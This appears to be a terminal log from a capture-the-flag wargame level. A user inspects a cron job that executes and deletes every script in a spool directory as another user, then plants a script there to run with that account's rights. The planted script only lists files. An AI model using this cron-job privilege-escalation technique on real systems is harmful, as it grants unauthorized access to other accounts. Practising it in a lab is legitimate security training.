Terminal
===
```
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in *;
do
    echo "Handling $i"
    ./$i
    rm -f $i
done

bandit23@melinda:/etc/cron.d$ ls -la /usr/bin/cronjob_bandit24.sh
-rwxr-x--- 1 bandit24 bandit23 185 Jun  6  2013 /usr/bin/cronjob_bandit24.sh

bandit23@melinda:/var/spool/bandit24$ mkdir /tmp/vv/
bandit23@melinda:/var/spool/bandit24$ chmod -R 777 /tmp/vv
bandit23@melinda:/var/spool/bandit24$ vim /tmp/vv/a.sh
#!/bin/bash
ls -la > /tmp/vv/out.txt

bandit23@melinda:/var/spool/bandit24$ chmod 777 /tmp/vv/a.sh
bandit23@melinda:/var/spool/bandit24$ cp /tmp/vv/a.sh /var/spool/bandit24/a.sh

bandit23@melinda:/var/spool/bandit24$ cat /tmp/vv/out.txt
total 9
drwx-wx--- 4 bandit24 bandit23 1024 Aug 19 22:15 .
drwxr-xr-x 6 root     root     4096 Jun  6  2013 ..
drwxrwxr-x 2 bandit23 bandit23 1024 Aug 17 07:46 akira
-rwxrwxr-x 1 bandit23 bandit23   37 Aug 19 22:15 a.sh
-rwxrwxr-x 1 bandit23 bandit23   90 Aug 16 06:51 .dump.sh
drwxrwxr-x 2 bandit24 bandit24 1024 Aug 17 20:36 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
